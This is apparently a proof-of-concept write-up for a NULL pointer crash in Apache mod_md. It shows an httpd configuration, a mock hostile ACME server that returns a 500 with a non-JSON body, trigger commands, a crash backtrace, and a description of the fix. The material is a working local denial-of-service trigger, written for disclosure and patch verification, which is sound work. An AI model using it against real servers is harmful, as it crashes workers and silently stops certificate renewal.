# PoC 170 — Authz Dereference After Failed Retrieval (mod_md)

`md_acme_order_start_challenges()` logs `authz->domain` after
`md_acme_authz_retrieve()` returns a non-success status. The retrieval can
fail with `authz == NULL`, so the failure-path log dereferences a NULL
pointer and crashes the mod_md worker.

## Setup

Module: `mod_md`. The httpd instance is configured to renew a managed
domain against a hostile ACMEv2 directory that we control.

`/tmp/170/httpd.conf` (essentials):

```apache
ServerRoot /tmp/170
Listen 127.0.0.1:8170
PidFile  /tmp/170/httpd.pid
ErrorLog /tmp/170/error.log
LoadModule mpm_event_module   modules/mod_mpm_event.so
LoadModule unixd_module       modules/mod_unixd.so
LoadModule authz_core_module  modules/mod_authz_core.so
LoadModule watchdog_module    modules/mod_watchdog.so
LoadModule md_module          modules/mod_md.so

MDCertificateAuthority http://127.0.0.1:8171/dir
MDCertificateAgreement accepted
MDStoreDir /tmp/170/md
MDomain example.test
```

### Mock ACME directory

A small Python server on `127.0.0.1:8171` answers:

- `GET  /dir` → standard directory JSON pointing at this server
- `HEAD /newNonce` → 200 with `Replay-Nonce: AAAA`
- `POST /newAccount` → 201 with `Location: /acct/1`
- `POST /newOrder` → 201 with body
  `{"status":"pending","authorizations":["http://127.0.0.1:8171/authz/1"],
   "finalize":"http://127.0.0.1:8171/finalize/1",
   "identifiers":[{"type":"dns","value":"example.test"}]}`
- `POST /authz/1` → **500 Internal Server Error** with a non-JSON body
  (e.g. `<html>nope</html>`).

The 500 + non-JSON body forces `md_acme_authz_retrieve()` to return failure
without populating `*authz`, so the local `authz` variable in
`md_acme_order_start_challenges()` is the uninitialized/NULL value seen in
practice on the failure branch.

## Trigger

```sh
python3 /tmp/170/acme.py &           # listener on 8171
httpd -X -f /tmp/170/httpd.conf &    # one mod_md worker
sleep 2                              # watchdog kicks in, drives renewal
```

The mod_md watchdog calls `md_acme_order_start_challenges()` for the
managed domain, the authz GET fails, and the failure branch executes
`authz->domain` against `authz == NULL`.

## Observed effect

- The `httpd -X` worker crashes with `SIGSEGV`. With `-g`:

  ```text
  Program received signal SIGSEGV, Segmentation fault.
  md_log_perror_arg () at modules/md/md_log.c
  #1 md_acme_order_start_challenges () at modules/md/md_acme_order.c:456
        rv == APR_EINVAL, authz == 0x0, accessing authz->domain
  ```

- `error.log` ends with the abnormal termination notice; the renewal job
  is dead and certificates are never refreshed (silent failure mode for
  long-running deployments).

- A coredump confirms the faulting `mov` is loading `domain` at offset
  ~0x10 of `authz`, with `%rdi == 0`.

After the patch the failure branch logs `... check authz at %s` using
`url`, which is always valid, and the same scenario produces an error log
line and a clean `goto leave;` instead of a crash.

## Cleanup

```sh
pkill -f /tmp/170/acme.py
kill $(cat /tmp/170/httpd.pid) 2>/dev/null
rm -rf /tmp/170
```
